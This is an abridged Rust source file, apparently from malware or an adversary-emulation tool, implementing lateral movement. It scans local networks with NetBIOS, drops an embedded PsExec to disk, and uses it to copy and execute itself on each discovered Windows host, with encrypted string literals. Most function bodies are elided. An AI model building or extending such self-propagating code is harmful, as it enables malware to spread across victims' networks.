...
use crate::latmove::nbtscan::ip_range::parse_ip_string;
use crate::latmove::nbtscan::lib::scan;
use crate::logger::{log_error, log_info};
use crate::psexec::{cleanup_psexec, get_psexec_path, setup_psexec, run_psexec};
use encryptliterals::esl;

/**
 * propagate_via_psexec
 *      About:
 *          Drops embedded PsExec to disk at C:\Windows\temp\pm.exe, and then spawns a PsExec process to copy and
 *          execute itself remotely on each target IP in local_targets.
 *          Removes the dropped PsExec executable after processing all targets. 
 *          If no targets are provided, PsExec will not be written to disk.
 *      Result:
 ...
 */
 pub fn propagate_via_psexec(local_targets: &Vec<Ipv4Addr>) -> Result<(), Box<dyn Error>> {
    if local_targets.len() == 0 {
        log_info(String::from(esl!("No local targets found to propagate to. Skipping PsExec propagation.")));
    } else {
        let success = setup_psexec(&get_psexec_path());
        match success {
 ...
 * find_local_targets
 *      About:
 *          Finds the local network range(s) and uses NetBIOS requests to find Windows hosts to propagate to.
 *          If providing strict_include_scan_ranges, the function will scan only those strict-include ranges that 
...
fn find_connected_ips(range_tuples: &Vec<(Ipv4Addr, u32)>, allowed_ranges: &Vec<String>) -> Result<Vec<Ipv4Addr>, Box<dyn Error>> {
    let mut deduped_and_filtered = dedupe_and_filter_ips(range_tuples, allowed_ranges);
    deduped_and_filtered.sort();
...
fn dedupe_and_filter_ips(range_tuples: &Vec<(Ipv4Addr, u32)>, allowed_ranges: &Vec<String>) -> Vec<Ipv4Addr> {
    ...
    let mut deduped_ips = HashSet::<Ipv4Addr>::new();
...
mod tests {
    ...
    fn test_filter_out_ips() {
        ...
        let mut result = filter_out_ips(&ips, &to_filter);
        assert_eq!(result, expected);

        result = filter_out_ips(&ips2, &to_filter);
